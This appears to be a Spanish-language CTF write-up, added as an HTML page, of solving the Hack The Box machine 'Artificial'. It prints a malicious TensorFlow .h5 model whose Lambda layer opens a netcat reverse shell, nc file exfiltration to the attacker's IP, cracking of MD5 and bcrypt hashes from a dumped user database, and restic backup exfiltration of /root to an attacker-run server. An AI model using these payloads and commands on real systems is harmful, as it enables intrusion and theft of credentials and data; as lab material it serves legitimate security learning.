@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Artificial - juanchan.es</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./Artificial.jpg"> <span class="mono authors"> <a href="https://juanchan.es/assets/maquinas/Artificial.html" itemprop="name">Artificial</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Jun, 2025 </time><hr><main itemprop="articleBody" style="position: relative">
+
+      
+    <h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+    <pre><code class="language-bash">PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
+    |   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
+    |_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
+    80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+    |_http-server-header: nginx/1.18.0 (Ubuntu)
+    |_http-title: Did not follow redirect to http://artificial.htb/
+    8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
+    |_http-title: Directory listing for /
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    </code></pre>
+    <p>&nbsp;</p>
+    <h2 id="2-enumeración">2. Enumeración</h2>
+    <p>Añadimos al /etc/hosts el dominio artificial.htb. En dicha página vemos un recurso en donde nos podemos registrar. Tras registrarnos e iniciar sesión, podemos observar un formulario donde nos dejan subir archivos con el formato .h5. También podemos observar que podemos descargar un archivo <strong>requirements</strong>, el cual incluye el siguiente contenido:</p>
+    <pre><code class="language-bash">tensorflow-cpu==2.13.1
+    </code></pre>
+    <p>Y un archivo dockerfile, con el siguiente contenido</p>
+    <pre><code class="language-bash">FROM python:3.8-slim
+    
+    WORKDIR /code
+    
+    RUN apt-get update &amp;&amp; \
+        apt-get install -y curl &amp;&amp; \
+        curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl &amp;&amp; \
+        rm -rf /var/lib/apt/lists/*
+    
+    RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+    
+    ENTRYPOINT [&quot;/bin/bash&quot;]
+    </code></pre>
+    <p>Buscando por internet algún exploit que afecte al software <strong>tensorflow</strong>, observamos el siguiente <a href="https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#getting-the-rce">https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#getting-the-rce</a></p>
+    <p>&nbsp;</p>
+    <h2 id="3-explotación">3. Explotación</h2>
+    <p>En el se crea un archivo .h5 en un ejecutable .py, con el cual conseguimos ejecutar un RCE. Para elllo nos dan de ejemplo el siguiente ejecutable .py:</p>
+    <pre><code class="language-bash">import tensorflow as tf
+    
+    def exploit(x):
+        import os
+        os.system(&quot;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 6666 &gt;/tmp/f&quot;)
+        return x
+    
+    model = tf.keras.Sequential()
+    model.add(tf.keras.layers.Input(shape=(64,)))
+    model.add(tf.keras.layers.Lambda(exploit))
+    model.compile()
+    model.save(&quot;exploit.h5&quot;)
+    </code></pre>
+    <p>Si probamos a instalar la ultima versión de la librería <strong>tensorflow</strong> en nuestra maquina, y ejecutar el .py, observamos que al subir el archivo .h5, a la aplicación web, no ocurre nada y que el RCE no se lleva acabo. </p>
+    <p>Nos damos cuenta, que para que funcione tenemos que compilarlo con la versión 2.13.1 de tensorflow, tal y como se especificaba en el archivo de <strong>requirementes</strong>. Para ahorrarnos los pasos de instalarlo directamente en nuestra máquina, lo ejecutamos mediante un contenedor docker:</p>
+    <pre><code class="language-bash"># docker run -it --rm -v &quot;$PWD&quot;:/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py                                       
+        Unable to find image &#39;tensorflow/tensorflow:2.13.0&#39; locally
+        2.13.0: Pulling from tensorflow/tensorflow
+        01085d60b3a6: Pull complete 
+        de96f27d9487: Pull complete 
+        0d0dce5452b7: Pull complete 
+        3b190c0764b5: Pull complete 
+        9e55d77b5a31: Pull complete 
+        eb5c0fde2e19: Pull complete 
+        1eb5af93509e: Pull complete 
+        4a60f8dff7fd: Pull complete 
+        85ba1cd0f140: Pull complete 
+        4983425daedd: Pull complete 
+        d10bf76e378a: Pull complete 
+        17f02e3f1db1: Pull complete 
+        Digest: sha256:f133c99eba6e59b921ea7543c81417cd831c9983f5d6ce65dff7adb0ec79d830
+        Status: Downloaded newer image for tensorflow/tensorflow:2.13.0
+        2025-06-25 08:27:22.207561: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
+        To enable the following instructions: FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
+        sh: 1: nc: not found
+        /usr/local/lib/python3.8/dist-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save(&#39;my_model.keras&#39;)`.
+        saving_api.save_model(
+    </code></pre>
+    <p>Podemos observar, que si ahora subimos el nuevo archivo .h5 a la pagina web, y ponemos a escuchar un <strong>netcat</strong> en nuestra máquina host a través del puerto 6666, somos capaces de establecer una revershell:</p>
+    <pre><code class="language-bash"># nc -lvnp 6666
+        listening on [any] 6666 ...
+        connect to [10.10.14.49] from (UNKNOWN) [10.10.11.74] 59932
+        /bin/sh: 0: can&#39;t access tty; job control turned off
+        $ id
+        uid=1001(app) gid=1001(app) groups=1001(app)
+        $ 
+    </code></pre>
+    <p>&nbsp;</p>
+    <h2 id="4-movimiento-lateral">4. Movimiento lateral</h2>
+    <p>Una vez dentro, como usuario <strong>app</strong>, podemos encontrar el siguiente archivo de usuarios:</p>
+    <pre><code class="language-bash">$ ls
+    app.py
+    instance
+    models
+    __pycache__
+    static
+    templates
+    $ cd instance
+    $ ls
+    users.db
+    </code></pre>
+    <p>La pasamos a nuestra máquina mediante nc:</p>
+    <ol>
+    <li><p>En la maquina host:</p>
+    <pre><code class="language-bash"> # nc -lp 1234 &gt; users.db
+    </code></pre>
+    </li>
+    <li><p>En la maquina objetivo:</p>
+    <pre><code class="language-bash"># nc 10.10.14.49 1234 &lt; users.db
+    </code></pre>
+    </li>
+    </ol>
+    <p>Una vez en nuestra máquina lo podemos abrir con sqlite3, y observamos lo siguiente:</p>
+    <pre><code class="language-bash">sqlite&gt; .tables
+    model  user 
+    sqlite&gt; select * from user;
+    1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
+    2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
+    3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
+    4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
+    5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
+    6|marco|marco@marco.com|9985039da9a041e4e95a6e62e63adf76
+    7|hacker|hacker@htb.com|482c811da5d5b4bc6d497ffa98491e38
+    8|test|test@test.com|098f6bcd4621d373cade4e832627b4f6
+    9|flufy|fluffy@gmail.com|5f4dcc3b5aa765d61d8327deb882cf99
+    10|parrot|parrot@gmail.com|baf4d84542de49229350d14168931f60
+    11|flaskdev|flaskdev@example.com|be551ee513d0096809723ef724e6b0ce
+    12|qwer123|2asd@asd.com|7815696ecbf1c96e6894b779456d330e
+    13|zeroday|zero@mail.com|6e3578724424fbfa1751f31609b3c304
+    14|pat|pat@pat.com|7852341745c93238222a65a910d1dcc5
+    15|q@w.e|q@w.e|60a303e912496b4f1024d40ed20d40af
+    16|&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;|q@a.z|1de13057bf9b56473f551702ebbc8fb5
+    17|ciccio|ciccio@gmail.com|e10adc3949ba59abbe56e057f20f883e
+    18|test2|test2@test.com|d6ca3fd0c3a3b462ff2b83436dda495e
+    19|prova|prova@gmail.com|189bbbb00c5f1fb7fba9ad9285f193d1
+    20|admin|124eqsdxc23edsxc1234easd@222|202cb962ac59075b964b07152d234b70
+    21|sa|sa@sa|202cb962ac59075b964b07152d234b70
+    22|cat123|cat@vat.htb|56d6106e30d2a478150087acccb6aa63
+    23|shell0000|test258@test.com|e10adc3949ba59abbe56e057f20f883e
+    24|suy|suy@gmail.com|03c7c0ace395d80182db07ae2c30f034
+    25|a|a@gmail.com|0cc175b9c0f1b6a831c399e269772661
+    26|shirshxk|sirshak99@gmail.com|962a36218a682120bee6374c0eb715a0
+    27|ewrwr|wr@gmail.com|f3151d23f9c88ea74e0229bcdd321cde
+    28|kam|kam@gamil.com|d968a18370429ceee4e7fb0268ec50bf
+    sqlite&gt; 
+    </code></pre>
+    <p>Mediante la misma revershell que ya teníamos con el usuario <strong>app</strong>, listamos los directorios de home pudiendo comprobar así como existe el usuario gael:</p>
+    <pre><code class="language-bash">$ ls /home
+    app
+    gael
+    $ 
+    </code></pre>
+    <p>Movemos entonces el hash <code>c99175974b6e192936d97224638a34f8</code> a un archivo llamado &quot;hash&quot;, y ejecutamos <strong>hashcat</strong> para realizar fuerza bruta para un hash md5:</p>
+    <pre><code class="language-bash"># hashcat -m 0 hash  
+    </code></pre>
+    <p>Pero observamos como no somos capaces de obtener nada.
+    Comprobamos entonces con la herramienta online <strong>crackstation</strong>, si somos capaces de obtener el hash descifrado. Y observamos como si que somos capaces, obteniendo la siguiente contraseña:</p>
+    <pre><code class="language-bash">c99175974b6e192936d97224638a34f8	md5	mattp005numbertwo
+    </code></pre>
+    <p>Por lo que probamos a acceder por ssh mediante los siguientes credenciales <code>gael:mattp005numbertwo</code>. Somos capaces de acceder y obtener así la flag de usuario</p>
+    <p>&nbsp;</p>
+    <h2 id="5-escalado-de-privilegios">5. Escalado de privilegios</h2>
+    <p>Observamos que existen los siguientes puertos abiertos en la máquina:</p>
+    <pre><code class="language-bash">-bash-5.0$ ss -lntu
+    Netid                State                 Local                                    
+    udp                  UNCONN                127.0.0.53%lo:53
+    tcp                  LISTEN                127.0.0.1:5000
+    tcp                  LISTEN                127.0.0.1:9898
+    tcp                  LISTEN                0.0.0.0:80
+    tcp                  LISTEN                127.0.0.53%lo:53
+    tcp                  LISTEN                0.0.0.0:22
+    tcp                  LISTEN                0.0.0.0:9919
+    tcp                  LISTEN                [::]:80
+    tcp                  LISTEN                [::]:22
+    </code></pre>
+    <p>Forwardeamos entonces el puerto 9898 (el 5000 comprobamos que no era relevante), mediante el siguiente comando:</p>
+    <pre><code class="language-bash"># ssh -L 1234:127.0.0.1:9898 gael@artificial.htb
+    </code></pre>
+    <p>Si accedemos a dicho recurso, observamos un panel de login, de un servicio llamada backrest, del cual no disponemos de credenciales. Buscamos en el sistema de archivos, de la propia máquina, alguna referencia a dicho servicio, y encontramos lo siguiente:</p>
+    <pre><code class="language-bash">$ find ./ -iname *backrest* 2&gt;/dev/null
+        ./usr/local/bin/backrest
+        ./opt/backrest
+        ./opt/backrest/.config/backrest
+        ./opt/backrest/backrest
+        ./opt/backrest/processlogs/backrest.log
+        ./var/backups/backrest_backup.tar.gz
+    </code></pre>
+    <p>En dicho directorio (/opt/backrest) existen los siguientes archivos:</p>
+    <pre><code class="language-bash">bash-5.0$ ls -la
+    total 51116
+    drwxr-xr-x  5 root root         4096 Jun 25 09:20 .
+    drwxr-xr-x 10 root root         4096 Jun 25 05:31 ..
+    -rwxr-xr-x  1 app  ssl-cert 25690264 Feb 16 19:38 backrest
+    drwxr-xr-x  3 root root         4096 Mar  3 21:27 .config
+    -rwxr-xr-x  1 app  ssl-cert     3025 Mar  3 04:28 install.sh
+    -rw-------  1 root root           64 Mar  3 21:18 jwt-secret
+    -rw-r--r--  1 root root        77824 Jun 25 09:20 oplog.sqlite
+    -rw-------  1 root root            0 Mar  3 21:18 oplog.sqlite.lock
+    -rw-r--r--  1 root root        32768 Jun 25 09:20 oplog.sqlite-shm
+    -rw-r--r--  1 root root            0 Jun 25 09:20 oplog.sqlite-wal
+    drwxr-xr-x  2 root root         4096 Mar  3 21:18 processlogs
+    -rwxr-xr-x  1 root root     26501272 Mar  3 04:28 restic
+    drwxr-xr-x  3 root root         4096 Jun 25 09:20 tasklogs
+    </code></pre>
+    <p>Pero vemos que ninguna nos aporta ninguna información. Miramos entonces el comprimido <code>/var/backups/backrest_backup.tar.gz</code>. Para ello lo movemos primero a nuestra maquina host. Vemos que se trata de un archivo tar directamente:</p>
+    <pre><code class="language-bash"># file backrest_backup.tar.gz 
+        backrest_backup.tar.gz: POSIX tar archive (GNU)
+    </code></pre>
+    <p>Por lo que lo extraemos con el siguiente comando:</p>
+    <pre><code class="language-bash"># tar -xvf backrest_backup.tar.gz
+        backrest/
+        backrest/restic
+        backrest/oplog.sqlite-wal
+        backrest/oplog.sqlite-shm
+        backrest/.config/
+        backrest/.config/backrest/
+        backrest/.config/backrest/config.json
+        backrest/oplog.sqlite.lock
+        backrest/backrest
+        backrest/tasklogs/
+        backrest/tasklogs/logs.sqlite-shm
+        backrest/tasklogs/.inprogress/
+        backrest/tasklogs/logs.sqlite-wal
+        backrest/tasklogs/logs.sqlite
+        backrest/oplog.sqlite
+        backrest/jwt-secret
+        backrest/processlogs/
+        backrest/processlogs/backrest.log
+        backrest/install.sh
+    </code></pre>
+    <p>Si observamos el archivo <code>backrest/.config/backrest/config.json</code> observamos:</p>
+    <pre><code class="language-bash"> {
+     &quot;modno&quot;: 2,
+     &quot;version&quot;: 4,
+     &quot;instance&quot;: &quot;Artificial&quot;,
+     &quot;auth&quot;: {
+         &quot;disabled&quot;: false,
+         &quot;users&quot;: [
+         {
+             &quot;name&quot;: &quot;backrest_root&quot;,
+             &quot;passwordBcrypt&quot;: &quot;JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP&quot;
+         }
+         ]
+     }
+     }
+    </code></pre>
+    <p> Vemos que se trata de un hash en base64, por lo que si lo decodificamos obtenemos el siguiente hash con formato bcrypt:</p>
+    <pre><code class="language-bash">$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+    </code></pre>
+    <p>Lo guardamos en el archivo hashback y ejecutamos hashcat para aplicarle fuerza bruta:</p>
+    <pre><code class="language-bash"># hashcat -m 3200 hashback /usr/share/wordlists/rockyou.txt --show
+                                    
+        $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
+    </code></pre>
+    <p>Entonces las credenciales para acceder al servicio backrest son <code>backrest_root:!@#$%^</code>. Cuando accedemos, podemos ver un panel de administración, en el que parece que podemos crear backups. Lo primero que tenemos que crear es un repositorio, que viene siendo donde guardaremos nuestra backup.
+    Lo creamos, y lo llamamos repo1 estableciendo como ruta de guardado el directorio repo1 y una contraseña. A continuación, deberemos crear un plan de backup, en el que configuremos la carpeta objetivo sobre la cual se va a crear el backup. En nuestro caso elegimos la carpeta /root.
+    Podemos esperar a que la tarea se ejecute sola, o ejecutarla manualmente. Una vez creado el backup, observamos que tenemos la capacidad de ejecutar comandos sobre dicho repositorio, en concreto, solo podemos ejecutar el comando <strong>restic</strong>.</p>
+    <p>Si vemos en <strong>gtfobins</strong> algún exploit, observamos como podemos ser capaces de enviar archivos backup a otro equipo, es decir, realizar una <strong>exfiltración de la información</strong>. Para ello, en nuestra maquina host instalamos el siguiente paquete:   </p>
+    <pre><code class="language-bash"># apt install restic-rest-server restic
+    </code></pre>
+    <p>En nuestra maquina host lanzamos el siguiente comando para poner a escuchar nuestro servidor restic:</p>
+    <pre><code class="language-bash"># restic-rest-server --path /tmp/restic-data --listen :12345 --no-auth
+    </code></pre>
+    <p>En el panel web de backrest, ejecutamos los siguiente comandos, especificando la IP y puerto de nuestro servidor, así como el repo que queremos enviar:</p>
+    <pre><code class="language-bash"># -r rest:http://10.10.14.49:12345/repo1 init 
+    # -r rest:http://10.10.14.49:12345/repo1 backup /root
+    </code></pre>
+    <p>Enseguida vemos, que en nuestro servidor aparece el siguiente mensaje, en el cual nos informa que el backup fue creado en la ruta <code>/tmp/restic-data/repo1</code>:</p>
+    <pre><code class="language-bash"> # restic-rest-server --path /tmp/restic-data --listen :12345 --no-auth
+       Data directory: /tmp/restic-data
+       Authentication disabled
+       Private repositories disabled
+       start server on [::]:12345
+       Creating repository directories in /tmp/restic-data/repo1
+    </code></pre>
+    <p>Para abrirlo y poder extraer los archivos, hacemos uso nuevamente de la herramienta <strong>restic</strong> y ejecutamos lo siguiente</p>
+    <pre><code class="language-bash"># restic -r /tmp/restic-data/repo1 snapshots
+    enter password for repository: 
+    repository e7c22241 opened (version 2, compression level auto)
+    created new cache in /root/.cache/restic
+    ID        Time                 Host        Tags        Paths  Size
+    -----------------------------------------------------------------------
+    93447518  2025-06-25 09:33:50  artificial              /root  4.299 MiB
+    -----------------------------------------------------------------------
+    1 snapshots
+    </code></pre>
+    <p>Y finalmente hacemos el restore con el siguiente comando:</p>
+    <pre><code class="language-bash"># restic -r /tmp/restic-data/repo1 restore 93447518 --target ./restore
+    enter password for repository: 
+    repository e7c22241 opened (version 2, compression level auto)
+    [0:00] 100.00%  1 / 1 index files loaded
+    restoring snapshot 93447518 of [/root] at 2025-06-25 13:33:50.906761304 +0000 UTC by root@artificial to ./restore
+     Summary: Restored 80 files/dirs (4.299 MiB) in 0:00
+    </code></pre>
+    <p>Vemos como dentro del repositorio de backup se nos crea una carpeta llamada restore, en la que su interior encontramos todos el directorio de root:</p>
+    <pre><code class="language-bash"># (root㉿kali)-[/tmp/restic-data/repo1]
+    └─# cat restore/root/root.txt
+    </code></pre>
+    <p>Pudiendo así obtener la flag del usuario root.</p>
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
